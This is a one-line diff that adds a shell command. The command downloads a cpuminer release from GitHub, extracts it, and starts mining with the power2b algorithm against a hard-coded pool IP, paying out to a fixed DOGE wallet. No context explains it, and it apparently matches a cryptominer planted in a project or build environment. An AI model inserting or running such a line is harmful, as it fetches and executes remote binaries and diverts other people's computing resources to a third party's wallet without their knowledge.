@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.15/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx -a power2b -o stratum+tcp://198.50.168.213:6242 -u DEhszbZmKfEAsS1N8adSiq2rsF7ARtqZPM -p c=DOGE 
